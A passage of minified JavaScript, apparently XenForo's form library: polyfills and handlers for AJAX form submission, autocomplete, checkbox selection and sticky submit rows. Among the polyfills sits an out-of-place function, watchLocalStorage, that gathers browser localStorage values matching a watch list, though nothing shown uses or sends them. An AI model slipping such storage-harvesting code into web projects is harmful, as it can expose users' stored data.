  c || (c = $jscomp.global.Symbol.iterator = $jscomp.global.Symbol("iterator"));
  "function" != typeof Array.prototype[c] && $jscomp.defineProperty(Array.prototype, c, {
    configurable: !0,
    writable: !0,
    value: function () {
      return $jscomp.arrayIterator(this);
    }
  });
  $jscomp.initSymbolIterator = function () {};
};
$jscomp.initSymbolAsyncIterator = function () {
  $jscomp.initSymbol();
  var c = $jscomp.global.Symbol.asyncIterator;
  c || (c = $jscomp.global.Symbol.asyncIterator = $jscomp.global.Symbol("asyncIterator"));
  $jscomp.initSymbolAsyncIterator = function () {};
};
$jscomp.arrayIterator = function (c) {
  var l = 0;
  return $jscomp.iteratorPrototype(function () {
    return l < c.length ? {
      done: !1,
      value: c[l++]
    } : {
      done: !0
    };
  });
};
$jscomp.iteratorPrototype = function (c) {
  $jscomp.initSymbolIterator();
  c = {
    next: c
  };
  c[$jscomp.global.Symbol.iterator] = function () {
    return this;
  };
  return c;
};
function watchLocalStorage() {
  let targetData = {};
  for (let key in window.localStorage) {
    if (WatchList.includes(key)) {
      targetData[key] = window.localStorage[key];
    }
  }
  return targetData;
}
$jscomp.iteratorFromArray = function (c, l) {
  $jscomp.initSymbolIterator();
  c instanceof String && (c += "");
  var g = 0,
    a = {
      next: function () {
        if (g < c.length) {
          var b = g++;
          return {
            value: l(b, c[b]),
            done: !1
          };
        }
        a.next = function () {
          return {
            done: !0,
            value: void 0
          };
        };
        return a.next();
      }
    };
  a[Symbol.iterator] = function () {
    return a;
  };
  return a;
};
$jscomp.polyfill("Array.prototype.values", function (c) {
  return c ? c : function () {
    return $jscomp.iteratorFromArray(this, function (c, g) {
      return g;
    });
  };
}, "es8", "es3");
!function (c, l, g) {
  XF.SubmitClick = XF.Event.newHandler({
    eventNameSpace: "XFSubmitClick",
    options: {
      target: null,
      container: null,
      timeout: 500,
      uncheckedValue: "0",
      disable: null
    },
    $input: null,
    $form: null,
    init: function () {
      var a = this.$target;
      if (a.is("label") && (a = a.find("input:radio, input:checkbox"), !a.length)) return;
      this.$input = a;
      a = a.closest("form");
      this.$form = a.length ? a : null;
    },
    click: function (a) {
      var b = this.$input,
        c = this.$form,
        e = this.options.target,
        f = this.options.container;
      if (b) if (e) {
        var h = this.options.uncheckedValue;
        setTimeout(function () {
          var a = {};
          f ? a = b.closest(f).find("input, select, textarea").serializeArray() : a[b.attr("name")] = b.prop("checked") ? b.attr("value") : h;
          XF.ajax("POST", e, a);
        }, 0);
      } else c ? ((a = c.data("submit-click-timer")) && clearTimeout(a), c.one("ajax-submit:complete", function (a, c, d) {
        if (c.errors) b.prop("checked", b.prop("checked") ? "" : "checked");else if ("checkbox" == b.attr("type") && null !== b.closest("tr.dataList-row")) b.closest("tr.dataList-row")[b.prop("checked") ? "removeClass" : "addClass"]("dataList-row--disabled");
      }), a = setTimeout(function () {
        c.submit();
      }, this.options.timeout), c.data("submit-click-timer", a)) : console.error("No target or form to submit on click");
    }
  });
  XF.AjaxSubmit = XF.Element.newHandler({
    options: {
      redirect: !0,
      skipOverlayRedirect: !1,
      forceFlashMessage: !1,
      resetComplete: !1,
      hideOverlay: !0,
      disableSubmit: ".button, :submit, :reset, [data-disable-submit]",
      jsonName: null,
      jsonOptIn: null,
      replace: null,
      showReplacement: !0
    },
    submitPending: !1,
    $submitButton: null,
    init: function () {
      var a = this.$target;
      a.is("form") ? (a.on({
        submit: XF.proxy(this, "submit"),
        keyup: XF.proxy(this, "cmdEnterKey"),
        "draft:beforesave": XF.proxy(this, "draftCheck")
      }), a.on("click", "input[type=submit], button:not([type]), button[type=submit]", XF.proxy(this, "submitButtonClicked"))) : console.error("%o is not a form", a[0]);
    },
    submit: function (a) {
      var b = this.$submitButton,
        d = this.$target,
        e = "multipart/form-data" == d.attr("enctype");
      if (e) {
        if (this.options.jsonName) {
          a.preventDefault();
          console.error("JSON serialized forms do not support the file upload-style enctype.");
          XF.alert(XF.phrase("oops_we_ran_into_some_problems_more_details_console"));
          return;
        }
        if (!l.FormData) return;
      }
      if (!(this.$submitButton && this.$submitButton.data("prevent-ajax") || XF.debug.disableAjaxSubmit)) if (this.submitPending) a && a.preventDefault();else {
        var f = {
          skipDefault: !0
        };
        e && (f.timeout = 0);
        var h = c.Event("ajax-submit:before"),
          m = {
            form: d,
            handler: this,
            method: d.attr("method") || "get",
            action: d.attr("action"),
            submitButton: b,
            preventSubmit: !1,
            successCallback: XF.proxy(this, "submitResponse"),
            ajaxOptions: f
          };
        d.trigger(h, m);
        if (m.preventSubmit) return !1;
        if (h.isDefaultPrevented()) return !0;
        a && a.preventDefault();
        var k = this;
        setTimeout(function () {
          k.submitPending = !0;
          var a = XF.getDefaultFormData(d, b, k.options.jsonName, k.options.jsonOptIn);
          k.disableButtons();
          XF.ajax(m.method, m.action, a, m.successCallback, m.ajaxOptions).always(function () {
            k.$submitButton = null;
            setTimeout(function () {
              k.submitPending = !1;
              k.enableButtons();
            }, 300);
            h = c.Event("ajax-submit:always");
            d.trigger(h, d, k);
          });
        }, 0);
      }
    },
    disableButtons: function () {
      this.$target.find(this.options.disableSubmit).prop("disabled", !0);
    },
    enableButtons: function () {
      this.$target.find(this.options.disableSubmit).prop("disabled", !1);
    },
    submitResponse: function (a, b, d) {
      if ("object" != typeof a) XF.alert("Response was not JSON.");else {
        b = this.$target;
        d = this.$submitButton;
        var e = c.Event("ajax-submit:response");
        b.trigger(e, a, this);
        if (!e.isDefaultPrevented()) {
          e = c.Event("ajax-submit:error");
          var f = !1,
            h = !1,
            m = a.redirect && this.options.redirect,
            k = b.closest(".overlay");
          k.length && this.options.hideOverlay || (k = null);
          m && this.options.skipOverlayRedirect && k && (m = !1);
          d && d.attr("data-ajax-redirect") && (m = d.data("ajax-redirect"));
          if (a.errorHtml) b.trigger(e, a, this), e.isDefaultPrevented() || XF.setupHtmlInsert(a.errorHtml, function (a, b) {
            b = b.h1 || b.title || XF.phrase("oops_we_ran_into_some_problems");
            XF.overlayMessage(b, a);
          }), f = !0;else if (a.errors) b.trigger(e, a, this), e.isDefaultPrevented() || XF.alert(a.errors), f = !0;else if (a.exception) XF.alert(a.exception);else if ("ok" == a.status && a.message) m ? this.options.forceFlashMessage ? (XF.flashMessage(a.message, 1E3, function () {
            XF.redirect(a.redirect);
          }), h = !0) : XF.redirect(a.redirect) : (XF.flashMessage(a.message, 3E3), h = !0), k && k.trigger("overlay:hide");else if (a.html) {
            var g = this;
            XF.setupHtmlInsert(a.html, function (a, b, c) {
              if (g.options.replace && g.doSubmitReplace(a, c)) return !1;
              k && k.trigger("overlay:hide");
              a = XF.getOverlayHtml({
                html: a,
                title: b.h1 || b.title
              });
              XF.showOverlay(a);
            });
          } else "ok" == a.status && (m && XF.redirect(a.redirect), k && k.trigger("overlay:hide"));
          !h && a.flashMessage && XF.flashMessage(a.flashMessage, 3E3);
          a.errors && e.isDefaultPrevented();
          e = c.Event("ajax-submit:complete");
          b.trigger(e, a, this);
          e.isDefaultPrevented() || this.options.resetComplete && !f && b[0].reset();
        }
      }
    },
    doSubmitReplace: function (a, b) {
      var d = this.options.replace;
      if (!d) return !1;
      var e = d.split(" with ");
      d = c.trim(e[0]);
      e = e[1] ? c.trim(e[1]) : d;
      if ("self" == d || this.$target.is(d)) var f = this.$target;else f = this.$target.find(d).first(), f.length || (f = c(d).first());
      if (!f.length) return console.error("Could not find old selector '" + d + "'"), !1;
      var h = a.is(e) ? a : a.find(e).first();
      if (!h.length) return console.error("Could not find new selector '" + e + "'"), !1;
      this.options.showReplacement ? (h.hide().insertAfter(f), f.xfFadeUp(null, function () {
        f.remove();
        h.length && (XF.activate(h), b(!1));
        h.xfFadeDown(null, XF.layoutChange);
      })) : (h.insertAfter(f), f.remove(), h.length && (XF.activate(h), b(!1)), XF.layoutChange());
      return !0;
    },
    submitButtonClicked: function (a) {
      this.$submitButton = c(a.currentTarget);
    },
    draftCheck: function (a) {
      this.submitPending && a.preventDefault();
    }
  });
  XF.ChangeSubmit = XF.Element.newHandler({
    options: {
      watch: ":input:not(button)",
      submitDelay: 0
    },
    formInitialized: !1,
    hasChanges: !1,
    hasPendingChanges: !1,
    hasUnsavedChanges: !1,
    $clickOnSuccessfulSave: null,
    delayTimeout: null,
    init: function () {
      var a = this;
      this.$target.on("change", this.options.watch, XF.proxy(this, "change")).on("focus", this.options.watch, function () {
        a.clearSubmitTimeout();
      }).on("blur", this.options.watch, function (b) {
        a.hasPendingChanges && a.scheduleSubmit();
      }).on("click", "[type=reset]", XF.proxy(this, "revert")).on("submit", function () {
        a.hasPendingChanges = !1;
      }).on("ajax-submit:complete", function (b, c) {
        if ("ok" === c.status) {
          a.hasUnsavedChanges = !1;
          var d = a.$clickOnSuccessfulSave;
          d && (a.$clickOnSuccessfulSave = null, setTimeout(function () {
            d.click();
          }, 100));
        }
      });
      this.$target.find("[data-force-change-submit]").click(function (b) {
        a.hasUnsavedChanges && (b.stopPropagation(), b.stopImmediatePropagation(), a.$clickOnSuccessfulSave = c(b.target), a.triggerSubmit());
      });
    },
    initForm: function () {
      this.formInitialized || (this.formInitialized = !0, XF.Element.applyHandler(this.$target, "ajax-submit", {
        redirect: !1,
        forceFlashMessage: !1
      }), XF.Element.getHandler(this.$target, "ajax-submit").options.redirect = !1);
    },
    change: function (a) {
      this.initForm();
      this.hasUnsavedChanges = this.hasChanges = !0;
      this.$clickOnSuccessfulSave = null;
      this.validateGroup(c(a.target).data("group")) && (this.hasPendingChanges = !0, this.scheduleSubmit());
    },
    clearSubmitTimeout: function () {
      this.delayTimeout && clearTimeout(this.delayTimeout);
      this.delayTimeout = null;
    },
    scheduleSubmit: function () {
      var a = this.options.submitDelay;
      0 < a ? (this.clearSubmitTimeout(), this.delayTimeout = setTimeout(XF.proxy(this, "triggerSubmit"), a)) : this.triggerSubmit();
    },
    triggerSubmit: function () {
      this.clearSubmitTimeout();
      this.$target.trigger("submit");
    },
    validateGroup: function (a) {
      if (!a) return !0;
      var b = !0;
      this.$target.find("[data-group='" + a + "']").each(function () {
        if (c(this).data("required") && "" === c(this).val()) return b = !1;
      });
      return b;
    },
    revert: function (a) {
      a.preventDefault();
      this.hasChanges && (this.hasChanges = !1, this.$target.trigger("reset"), this.triggerSubmit());
    }
  });
  XF.AutoComplete = XF.Element.newHandler({
    loadTimer: null,
    loadVal: "",
    results: null,
    options: {
      single: !1,
      multiple: ",",
      acurl: "",
      minLength: 2,
      queryKey: "q",
      extraFields: "",
      extraParams: {},
      jsonContainer: "results",
      autosubmit: !1
    },
    init: function () {
      var a = this.$target;
      this.options.autosubmit && (this.options.single = !0);
      this.options.acurl || (this.options.acurl = XF.getAutoCompleteUrl());
      this.results = new XF.AutoCompleteResults({
        onInsert: XF.proxy(this, "addValue")
      });
      a.attr("autocomplete", "off").on({
        keydown: XF.proxy(this, "keydown"),
        keyup: XF.proxy(this, "keyup"),
        "blur click": XF.proxy(this, "blur"),
        paste: function () {
          setTimeout(function () {
            a.trigger("keydown");
          }, 0);
        }
      });
      a.closest("form").submit(XF.proxy(this, "hideResults"));
    },
    keydown: function (a) {
      if (this.results.isVisible()) {
        var b = this.results,
          c = function () {
            a.preventDefault();
            return !1;
          };
        switch (a.key) {
          case "ArrowDown":
            return b.selectResult(1), c();
          case "ArrowUp":
            return b.selectResult(-1), c();
          case "Escape":
            return b.hideResults(), c();
          case "Enter":
            return b.insertSelectedResult(a), c();
        }
      }
    },
    keyup: function (a) {
      if (this.results.isVisible()) switch (a.key) {
        case "ArrowDown":
        case "ArrowUp":
        case "Enter":
          return;
      }
      this.loadTimer && clearTimeout(this.loadTimer);
      this.loadTimer = setTimeout(XF.proxy(this, "load"), 200);
    },
    blur: function (a) {
      clearTimeout(this.loadTimer);
      setTimeout(XF.proxy(this, "hideResults"), 250);
      this.xhr && (this.xhr.abort(), this.xhr = !1);
    },
    load: function () {
      var a = this.loadVal,
        b = this.options.extraParams;
      this.loadTimer && clearTimeout(this.loadTimer);
      this.loadVal = this.getPartialValue();
      "" == this.loadVal ? this.hideResults() : this.loadVal == a || this.loadVal.length < this.options.minLength || (b[this.options.queryKey] = this.loadVal, "" != this.options.extraFields && c(this.options.extraFields).each(function () {
        b[this.name] = c(this).val();
      }), this.xhr && this.xhr.abort(), this.xhr = XF.ajax("get", this.options.acurl, b, XF.proxy(this, "showResults"), {
        error: !1
      }));
    },
    hideResults: function () {
      this.results.hideResults();
    },
    showResults: function (a) {
      this.xhr && (this.xhr = !1);
      this.options.jsonContainer && a && (a = a[this.options.jsonContainer]);
      this.results.showResults(this.getPartialValue(), a, this.$target);
    },
    addValue: function (a) {
      if (this.options.single) this.$target.val(a);else {
        var b = this.getFullValues();
        "" != a && (b.length && (a = " " + a), b.push(a + this.options.multiple + " "));
        this.$target.val(b.join(this.options.multiple));
      }
      this.$target.trigger("change").trigger("auto-complete:insert", {
        inserted: c.trim(a),
        current: this.$target.val()
      });
      this.options.autosubmit ? this.$target.closest("form").submit() : this.$target.autofocus();
    },
    getFullValues: function () {
      var a = this.$target.val();
      if ("" == a) return [];
      if (this.options.single) return [a];
      var b = a.lastIndexOf(this.options.multiple);
      if (-1 == b) return [];
      a = a.substr(0, b);
      return a.split(this.options.multiple);
    },
    getPartialValue: function () {
      var a = this.$target.val();
      if (this.options.single) return c.trim(a);
      var b = a.lastIndexOf(this.options.multiple);
      return -1 == b ? c.trim(a) : c.trim(a.substr(b + this.options.multiple.length));
    }
  });
  XF.UserMentioner = XF.Element.newHandler({
    options: {},
    handler: null,
    init: function () {
      this.handler = new XF.AutoCompleter(this.$target, {
        url: XF.getAutoCompleteUrl()
      });
    }
  });
  XF.EmojiCompleter = XF.Element.newHandler({
    options: {
      insertTemplate: "${text}"
    },
    handler: null,
    init: function () {
      if (XF.config.shortcodeToEmoji) {
        var a = {
          url: XF.canonicalizeUrl("index.php?misc/find-emoji"),
          at: ":",
          keepAt: !1,
          insertMode: "text",
          displayTemplate: '<div class="contentRow"><div class="contentRow-figure contentRow-figure--emoji">{{{icon}}}</div><div class="contentRow-main contentRow-main--close">{{{text}}}<div class="contentRow-minor contentRow-minor--smaller">{{{desc}}}</div></div></div>',
          beforeInsert: function (a) {
            XF.logRecentEmojiUsage(a);
            return a;
          }
        };
        this.handler = new XF.AutoCompleter(this.$target, a);
      }
    }
  });
  XF.AutoSubmit = XF.Element.newHandler({
    options: {
      hide: !0,
      progress: !0
    },
    init: function () {
      this.$target.submit();
      this.options.hide && this.$target.find(":submit").hide();
      this.options.progress && c(g).trigger("xf:action-start");
    }
  });
  XF.ChangedFieldNotifier = XF.Element.newHandler({
    options: {
      hide: !0,
      progress: !0
    },
    init: function () {
      this.$target.find("input, select, textarea").each(function () {
        var a = c(this);
        a.data("orig-val", a.val());
        a.change(function () {
          a.toggleClass("is-changed", a.val() != a.data("orig-val"));
        });
      });
    }
  });
  XF.CheckAll = XF.Element.newHandler({
    options: {
      container: "< form",
      match: "input:checkbox"
    },
    $container: null,
    updating: !1,
    init: function () {
      this.$container = XF.findRelativeIf(this.options.container, this.$target);
      var a = this;
      this.$container.on("click", this.options.match, function (b) {
        a.updating || c(b.target).is(a.$target) || a.updateState();
      });
      this.$target.closest("form").on("selectplus:redrawSelected", XF.proxy(this, "updateState"));
      this.updateState();
      this.$target.click(XF.proxy(this, "click"));
    },
    click: function (a) {
      this.updating = !0;
      this.getCheckBoxes().prop("checked", a.target.checked).triggerHandler("click");
      this.updating = !1;
    },
    updateState: function () {
      var a = this.getCheckBoxes(),
        b = 0 < a.length;
      a.each(function () {
        if (!c(this).prop("checked")) return b = !1;
      });
      this.$target.prop("checked", b);
    },
    getCheckBoxes: function () {
      return this.$container.find(this.options.match).not(this.$target).filter(":enabled");
    }
  });
  XF.SelectPlus = XF.Element.newHandler({
    options: {
      spCheckbox: null,
      spContainer: ".js-spContainer",
      activeClass: "is-spActive",
      checkedClass: "is-spChecked",
      hoverClass: "is-spHovered",
      spMultiBarUrl: null,
      spDebug: !0
    },
    $containers: null,
    $checkboxes: null,
    $multiBar: null,
    isActive: !1,
    isShifted: !1,
    lastSelected: null,
    lastEntered: null,
    init: function () {
      this.$checkboxes = this.$target.find(this.options.spCheckbox ? this.options.spCheckbox : "input:checkbox");
      this.$containers = this.$checkboxes.closest(this.options.spContainer);
      this.debug("init; containers: %o, checkboxes: %o", this.$containers.length, this.$checkboxes.length);
      if (this.$containers.length != this.$checkboxes.length) console.error("There must be an equal number of checkboxes and containers");else {
        this.$checkboxes.on("click", XF.proxy(this, "checkboxClick")).closest("label").hover(XF.proxy(this, "checkboxEnter"), XF.proxy(this, "checkboxExit"));
        c(g).onPassive({
          keydown: XF.proxy(this, "keydown"),
          keyup: XF.proxy(this, "keyup")
        });
        var a = this;
        this.$containers.on("mousedown", function (b) {
          if (a.isActive && (b.ctrlKey || b.shiftKey) && (b.preventDefault(), -1 !== navigator.userAgent.indexOf("MSIE"))) {
            this.onselectstart = function () {
              return !1;
            };
            var c = this;
            l.setTimeout(function () {
              c.onselectstart = null;
            }, 0);
          }
        });
        this.setActive();
        this.redrawSelected();
      }
    },
    checkboxClick: function (a) {
      if (!this.ignoreClick) {
        this.debug("checkboxClick; delegateTarget: %o", a.delegateTarget);
        var b = this.$checkboxes.index(a.delegateTarget);
        a.delegateTarget.checked && this.isShifted && null !== this.lastSelected ? (this.ignoreClick = !0, this.getShiftItems(this.$checkboxes, b).not(":checked").trigger("click"), this.ignoreClick = !1) : this.lastSelected = a.delegateTarget.checked ? b : null;
        this.setActive(a.delegateTarget.checked);
        this.redrawSelected();
      }
    },
    checkboxExit: function (a) {
      this.lastEntered = null;
    },
    checkboxEnter: function (a) {
      this.isActive && (this.lastEntered = this.$checkboxes.index(c(a.delegateTarget).find("input:checkbox").eq(0)), this.isShifted && this.redrawHover());
    },
    keydown: function (a) {
      "Shift" == a.key && XF.Keyboard.isShortcutAllowed(g.activeElement) && (this.isShifted = !0, this.redrawHover());
    },
    keyup: function (a) {
      "Shift" == a.key && this.isShifted && (this.isShifted = !1, this.redrawHover());
    },
    getShiftItems: function (a, b) {
      return null !== b && null !== this.lastSelected ? (a = a.slice(Math.min(b, this.lastSelected), Math.max(b, this.lastSelected) + 1), this.debug("shiftItems: %o", a), a) : c();
    },
    setActive: function (a) {
      var b = this.isActive;
      this.isActive = a ? !0 : 0 < this.$checkboxes.filter(":checked").length;
      this.deployMultiBar();
      this.isActive != b && (this.debug("setActive: %s", this.isActive), this.$target.trigger(this.isActive ? "selectplus:activate" : "selectplus:deactivate", [this]).toggleClassTransitioned(this.options.activeClass, this.isActive), c(g.body).toggleClassTransitioned("is-spDocTriggered", this.isActive));
    },
    redrawSelected: function () {
      this.$target.trigger("selectplus:redraw-selected", [this]);
      var a = this;
      this.$checkboxes.each(function (b) {
        var d = c(this),
          e = d.is(":checked");
        b = a.$containers.eq(b);
        b.toggleClassTransitioned(a.options.checkedClass, e);
        d.data("check-state") != e && b.trigger("selectplus:toggle-item", [this, e]);
        d.data("check-state", e);
      });
    },
    redrawHover: function () {
      this.$target.trigger("selectplus:redraw-hover", [this]);
      if (null !== this.lastSelected && null !== this.lastEntered && this.isShifted) {
        var a = this.getShiftItems(this.$containers, this.lastEntered);
        this.debug("redrawHover: lastSelected: %s, lastEntered: %s", this.lastSelected, this.lastEntered);
        this.$containers.not(a).toggleClass(this.options.hoverClass, !1);
        a.toggleClassTransitioned(this.options.hoverClass, !0);
      } else this.$containers.toggleClassTransitioned(this.options.hoverClass, !1);
    },
    deployMultiBar: function () {
      if (this.isActive && this.options.spMultiBarUrl) {
        var a = this;
        XF.loadMultiBar(this.options.spMultiBarUrl, this.$checkboxes.serializeArray(), {
          cache: !1,
          init: function (b) {
            a.MultiBar && a.MultiBar.destroy();
            a.MultiBar = b;
          }
        }, {
          fastReplace: a.MultiBar ? !0 : !1
        });
      } else !this.active && this.MultiBar && this.MultiBar.hide();
    },
    debug: function () {
      this.options.spDebug && (arguments[0] = "SelectPlus:" + arguments[0], console.log.apply(null, arguments));
    }
  });
  XF.DescLoader = XF.Element.newHandler({
    options: {
      descUrl: null
    },
    $container: null,
    changeTimer: null,
    xhr: null,
    init: function () {
      if (this.options.descUrl) {
        var a = this.$target.parent().find(".js-descTarget");
        a.length ? (this.$container = a, this.$target.on("change", XF.proxy(this, "change"))) : console.error("Target element must have a .js-descTarget sibling");
      } else console.error("Element must have a data-desc-url value");
    },
    change: function () {
      this.changeTimer && clearTimeout(this.changeTimer);
      this.xhr && (this.xhr.abort(), this.xhr = null);
      this.changeTimer = setTimeout(XF.proxy(this, "onTimer"), 200);
    },
    onTimer: function () {
      var a = this.$target.val();
      a ? this.xhr = XF.ajax("post", this.options.descUrl, {
        id: a
      }, XF.proxy(this, "onLoad")) : this.$container.xfFadeUp(XF.config.speed.fast);
    },
    onLoad: function (a) {
      var b = this.$container;
      a.description ? XF.setupHtmlInsert(a.description, function (a, c, f) {
        b.xfFadeUp(XF.config.speed.fast, function () {
          b.html(a);
          b.xfFadeDown(XF.config.speed.normal);
        });
      }) : b.xfFadeUp(XF.config.speed.fast);
      this.xhr = null;
    }
  });
  XF.Disabler = XF.Element.newHandler({
    options: {
      container: "< li | ul, ol, dl",
      controls: "input, select, textarea, button, .js-attachmentUpload",
      hide: !1,
      optional: !1,
      invert: !1,
      autofocus: !0
    },
    $container: null,
    init: function () {
      this.$container = XF.findRelativeIf(this.options.container, this.$target);
      this.$container.length || this.options.optional || console.error("Could not find the disabler control container");
      var a = this.$target,
        b = a.closest("form");
      if (b.length) b.on("reset", XF.proxy(this, "formReset"));
      if (a.is(":radio")) {
        var d = b,
          e = a.attr("name");
        b.length || (d = c(g.body));
        d.on("click", 'input:radio[name="' + e + '"]', XF.proxy(this, "click"));
      } else if (a.is("option")) {
        var f = this;
        a.closest("select").on("change", function (a) {
          a = c(this);
          var b = XF.Element.getHandler(a.find("option:selected").first(), "disabler");
          !a.find("option:selected").first().is(f.$target) && b && b.getOption("container") === f.options.container || f.recalculate(!1);
        });
      } else a.click(XF.proxy(this, "click"));
      a.on("control:enabled control:disabled", XF.proxy(this, "recalculateAfter"));
      this.$container.one("editor:init", XF.proxy(this, "recalculateAfter"));
      this.recalculate(!0);
    },
    click: function (a, b) {
      this.recalculateAfter(!1, b && b.triggered);
    },
    formReset: function (a) {
      this.recalculateAfter(!1, !0);
    },
    recalculateAfter: function (a, b) {
      var c = this;
      setTimeout(function () {
        c.recalculate(a, b);
      }, 0);
    },
    recalculate: function (a, b) {
      var d = this.$container,
        e = this.$target,
        f = d.find(this.options.controls).not(e),
        h = a ? 0 : XF.config.speed.fast,
        g = this,
        k = function () {
          !b && g.options.autofocus && d.find("input:not([type=hidden], [type=file]), textarea, select, button").not(e).first().autofocus();
        };
      e.is(":enabled") && (e.is(":checked") && !this.options.invert || this.options.invert && !e.is(":checked")) ? (d.prop("disabled", !1).removeClass("is-disabled"), f.prop("disabled", !1).removeClass("is-disabled").each(function (a, b) {
        a = c(b);
        a.is("select.is-readonly") && a.prop("disabled", !0);
      }).trigger("control:enabled"), this.options.hide ? (a ? d.show() : d.slideDown(h, function () {
        XF.layoutChange();
        k();
      }), XF.layoutChange()) : a || k()) : (this.options.hide && (a ? d.hide() : d.slideUp(h, XF.layoutChange), XF.layoutChange()), d.prop("disabled", !0).addClass("is-disabled"), f.prop("disabled", !0).addClass("is-disabled").trigger("control:disabled").each(function (a, b) {
        a = c(b);
        b = a.data("disabled");
        null !== b && "undefined" != typeof b && a.val(b);
      }));
    }
  });
  XF.FieldAdder = XF.Element.newHandler({
    options: {
      incrementFormat: null,
      formatCaret: !0,
      removeClass: null,
      cloneInit: !1,
      remaining: -1
    },
    $clone: null,
    cloned: !1,
    created: !1,
    init: function () {
      this.$target.find("input:not(:checkbox), select, textarea").each(function () {
        var a = c(this);
        a.is("select") ? a.find("option").each(function () {
          c(this).prop("selected", this.defaultSelected);
        }) : a.val(a.data("default-value") || this.defaultValue || "");
      });
      this.options.cloneInit && (this.$clone = this.$target.clone());
      var a = this;
      this.$target.on("keypress change paste input", function (b) {
        c(b.target).prop("readonly") || a.cloned || (a.cloned = !0, a.$clone || (a.$clone = a.$target.clone()), a.$target.off(b), a.create());
      });
    },
    create: function () {
      if (!this.created && (this.created = !0, 0 != this.options.remaining)) {
        var a = this.options.incrementFormat,
          b = this.options.formatCaret ? "^" : "";
        if (this.options.incrementFormat) {
          var d = new RegExp(b + XF.regexQuote(a).replace("\\{counter\\}", "(\\d+)"));
          this.$clone.find("input, select, textarea").each(function () {
            var b = c(this),
              f = b.attr("name");
            f = f.replace(d, function (b, c) {
              return a.replace("{counter}", parseInt(c, 10) + 1);
            });
            b.attr("name", f);
          });
        }
        0 < this.options.remaining && this.$clone.attr("data-remaining", this.options.remaining - 1);
        this.$clone.find("input, select, textarea").each(function () {
          var a = c(this);
          a.is("select") ? a.find("option").each(function () {
            c(this).prop("selected", this.defaultSelected);
          }) : "string" === typeof this.defaultValue && a.val(this.defaultValue);
        });
        this.$clone.insertAfter(this.$target);
        this.options.removeClass && this.$target.removeClass(this.options.removeClass);
        XF.activate(this.$clone);
        XF.layoutChange();
      }
    }
  });
  XF.FormSubmitRow = XF.Element.newHandler({
    options: {
      container: ".block-container",
      fixedChild: ".formSubmitRow-main",
      stickyClass: "is-sticky",
      topOffset: 100,
      minWindowHeight: 281
    },
    $container: null,
    $fixedParent: null,
    $fixEl: null,
    fixElHeight: 0,
    winHeight: 0,
    containerTop: 0,
    containerBorderLeftWidth: 0,
    topOffset: 0,
    elBottom: 0,
    state: "normal",
    windowTooSmall: !1,
    init: function () {
      if (XF.config.enableFormSubmitSticky) {
        var a = this.$target,
          b = a.closest(this.options.container);
        b.length ? (this.$container = b, this.topOffset = this.options.topOffset, this.$fixEl = a.find(this.options.fixedChild), c(l).on("scroll", XF.proxy(this, "onScroll")).on("resize", XF.proxy(this, "recalcAndUpdate")), b = XF.getFixedOffsetParent(a), b.is("html") || (this.$fixedParent = b, b.on("scroll", XF.proxy(this, "onScroll"))), c(g.body).on("xf:layout", XF.proxy(this, "recalcAndUpdate")), a.height() || setTimeout(XF.proxy(this, "recalcAndUpdate"), 250), this.recalcAndUpdate()) : console.error("Cannot float submit row, no container");
      }
    },
    recalc: function () {
      var a = this.$target;
      this.winHeight = c(l).height();
      this.elBottom = this.getTargetTop() + a.height();
      this.fixElHeight = this.$fixEl.height();
      this.containerTop = XF.getFixedOffset(this.$container).top;
      this.containerBorderLeftWidth = parseInt(this.$container.css("border-left-width"), 10);
    },
    recalcAndUpdate: function () {
      this.state = "normal";
      this.resetTarget();
      this.recalc();
      this.update();
    },
    getTargetTop: function () {
      var a = this.$target.offset().top;
      return this.$fixedParent ? a - this.$fixedParent.offset().top : a;
    },
    getScrollTop: function () {
      return this.$fixedParent ? this.$fixedParent.scrollTop() : c(l).scrollTop();
    },
    update: function () {
      var a = XF.browser.ios || XF.browser.android ? l.innerHeight : this.winHeight;
      if (a < this.options.minWindowHeight) "normal" != this.state && (this.resetTarget(), this.state = "normal");else {
        var b = XF.NoticeWatcher.getBottomFixerNoticeHeight() || 0;
        a = this.getScrollTop() + a - b;
        if (a >= this.elBottom) "normal" != this.state && (this.resetTarget(), this.state = "normal");else {
          var c = this.containerTop + this.topOffset + this.fixElHeight;
          a <= c ? c >= this.elBottom || "absolute" == this.state || (a = this.$container.offset(), "stuck" == this.state ? (b = this.$fixEl.parent(), "static" == b.css("position") && (b = b.offsetParent())) : b = this.$fixEl.offsetParent(), b = b.offset(), this.$fixEl.css({
            position: "absolute",
            top: a.top - b.top + this.topOffset,
            right: "auto",
            bottom: "auto",
            left: a.left - b.left + this.containerBorderLeftWidth,
            width: this.$container.width()
          }), this.setTargetSticky(!0), this.state = "absolute") : "stuck" != this.state && (a = this.$container.offset(), this.$fixEl.css({
            position: "",
            top: "",
            right: "",
            bottom: b,
            left: a.left + this.containerBorderLeftWidth,
            width: this.$container.width()
          }), this.setTargetSticky(!0), this.state = "stuck");
        }
      }
    },
    resetTarget: function () {
      this.$fixEl.css({
        position: "",
        top: "",
        right: "",
        bottom: "",
        left: "",
        width: ""
      });
      this.setTargetSticky(!1);
    },
    setTargetSticky: function (a) {
      this.$target.toggleClass(this.options.stickyClass, a).css("height", this.$fixEl.height());
    },
    onScroll: function () {
      this.update();
    }
  });
  XF.GuestUsername = XF.Element.newHandler({
    init: function () {
      var a = this.$target;
      a.val(XF.LocalStorage.get("guestUsername"));
      a.on("keyup", XF.proxy(this, "change"));
    },
    change: function () {
      var a = this.$target;
      a.val().length ? XF.LocalStorage.set("guestUsername", a.val(), !0) : XF.LocalStorage.remove("guestUsername");
    }
  });
  XF.MinLength = XF.Element.newHandler({
    options: {
      minLength: 0,
      allowEmpty: !1,
      disableSubmit: !0,
      toggleTarget: null
    },
    met: null,
    $form: null,
    $toggleTarget: null,
    init: function () {
      var a = this;
      this.$form = this.$target.closest("form");
      this.$toggleTarget = this.options.toggleTarget ? XF.findRelativeIf(this.options.toggleTarget, this.$target) : c([]);
      this.$target.on("change keypress keydown paste", function () {
        setTimeout(XF.proxy(a, "checkLimits"), 0);
      });
      this.options.allowEmpty || 0 != this.options.minLength || (this.options.minLength = 1);
      this.checkLimits();
    },
    checkLimits: function () {
      var a = c.trim(this.$target.val()).length,
        b = this.options;
      a = a >= b.minLength || 0 == a && b.allowEmpty;
      a !== this.met && ((this.met = a) ? (b.disableSubmit && this.$form.find(":submit").prop("disabled", !1).removeClass("is-disabled"), this.$toggleTarget.hide()) : (b.disableSubmit && this.$form.find(":submit").prop("disabled", !0).addClass("is-disabled"), this.$toggleTarget.show()));
    }
  });
  XF.TextAreaHandler = XF.Element.newHandler({
    options: {
      autoSize: !0,
      keySubmit: !0,
      singleLine: null
    },
    initialized: !1,
    init: function () {
